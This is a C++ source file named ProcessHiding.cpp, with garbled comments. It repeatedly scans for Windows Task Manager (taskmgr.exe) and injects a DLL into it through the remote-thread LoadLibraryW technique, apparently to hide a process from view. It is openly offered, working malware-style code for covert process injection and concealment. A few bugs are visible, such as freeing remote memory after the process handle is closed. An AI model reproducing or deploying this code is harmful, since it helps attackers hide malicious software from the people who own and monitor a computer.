// ProcessHiding.cpp : �������̨Ӧ�ó������ڵ㡣
//

//����ĿΪ������ exe���� ʹdll��������

#include "stdafx.h"

#include <io.h>
#include <time.h>
#include <conio.h>
#include <fstream>

using namespace std;

ofstream infile3;

char* filename3 = "C:\\outputexe.txt";


#pragma comment(lib, "advapi32.lib")

TCHAR * DLL_NAME = L"InjectDll.dll";

BOOL InjectRemoteThread(DWORD ProcessID);
void Test();

int main()
{

	int count = 0;
	bool already = false;
	TCHAR dllpathBuffer[MAX_PATH];
	GetFullPathName(DLL_NAME, MAX_PATH, dllpathBuffer, NULL);
	DLL_NAME = dllpathBuffer;

	infile3.open(filename3);

	do{
		//printf("\n\n��%d��ɨ��...\n", count + 1);
		Sleep(2000);
		//Get first process in list
		HANDLE hProcessSnap = NULL;

		PROCESSENTRY32 peProcess = { 0 };

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == INVALID_HANDLE_VALUE)
		{//INVALID_HANDLE_VALUEΪHANDLE����Чֵ
			printf("Unable to get process list (%d).\n", GetLastError());
			return 0;
		}

		peProcess.dwSize = sizeof(PROCESSENTRY32);

		WCHAR wProcessName[100] = L"taskmgr.exe";
		//StringCbPrintf(wProcessName, 100, L"%S", ProcessName);
		//wprintf(L"Try to find proccess name '%s' \n", wProcessName);

		bool bFound = false;

		if (Process32First(hProcessSnap, &peProcess))
		{
			count++;
			do
			{
				if (!wcscmp(peProcess.szExeFile, wProcessName))
				{
					//wprintf(L"\n Found %s ProcessID: %d \n", wProcessName, peProcess.th32ProcessID);
					bFound = true;
					if (already == false)
					{

						InjectRemoteThread(peProcess.th32ProcessID);
						//ע��Զ���߳�
						printf("hiding OK!\n");
						already = true;
					}


				}
			} while (Process32Next(hProcessSnap, &peProcess));
		}

		if (!bFound)
		{
			//wprintf(L"\n Process '%s' not found!\n\n", wProcessName);
			already = false;
		}

		time_t t;
		infile3 << time(&t) << endl;
		infile3.close();
		//int iii;
		//scanf("%d", &iii);

		//printf("\n��%d��ɨ�����...\n\n", count);


	} while (true);

	system("pause");

	return 0;
}

void Test()
{
	//printf("ע��ע��ע��\n\n");
}



//ע��Զ���߳�
BOOL InjectRemoteThread(DWORD ProcessID)
{

	if (!ProcessID)
	{
		MessageBox(NULL, (LPCWSTR)GetLastError(), L"An error occured, ProcessID Error.", NULL);
		return 0;
	}

	//OpenProcess()����Ŀ�����������ý��̾�����Ա��������
	HANDLE RemoteProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessID);
	if (!RemoteProc)
	{
		MessageBox(NULL, (LPCWSTR)GetLastError(), L"An error occured, Fail to OpenProc", NULL);
		return 0;
	}

	//GetProcAddress()����ָ���Ķ�̬���ӿ��еĺ�����ַ
	LPVOID LoadLibAddress = (LPVOID)GetProcAddress(
		GetModuleHandleA("kernel32.dll"),
		"LoadLibraryW");

	infile3 << "LoadLibraryW" << LoadLibAddress << endl;

	//VirtualAllocEx()����̷����ڴ�
	LPVOID MemAlloc = (LPVOID)VirtualAllocEx(
		RemoteProc,
		NULL,
		(wcslen(DLL_NAME) + 1) * 2,		//��������ڴ��С���ֽڵ�λ
		//strlen(DLL_NAME) + 1,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE);
	infile3 << "RemoteProc " << RemoteProc << endl;

	//printf("\n Memory Address to Write:0x%08x \n", MemAlloc);

	//WriteProcessMemory()��Ŀ�����д�뺯����Ҫ���ص�dll����
	WriteProcessMemory(
		RemoteProc,
		(LPVOID)MemAlloc,
		DLL_NAME,
		(wcslen(DLL_NAME) + 1) * 2,
		//strlen(DLL_NAME) + 1,
		NULL);

	//CreateRemoteThread()��Ŀ������д���һ���߳�
	CreateRemoteThread(
		RemoteProc,
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)LoadLibAddress,
		(LPVOID)MemAlloc,
		NULL,
		NULL);

	CloseHandle(RemoteProc);

	//�ͷ�����������ڴ�ռ�
	VirtualFreeEx(
		RemoteProc,
		(LPVOID)MemAlloc,
		0,
		MEM_RELEASE | MEM_DECOMMIT);

	infile3 << "error " << GetLastError() << endl;

	return 1;
}

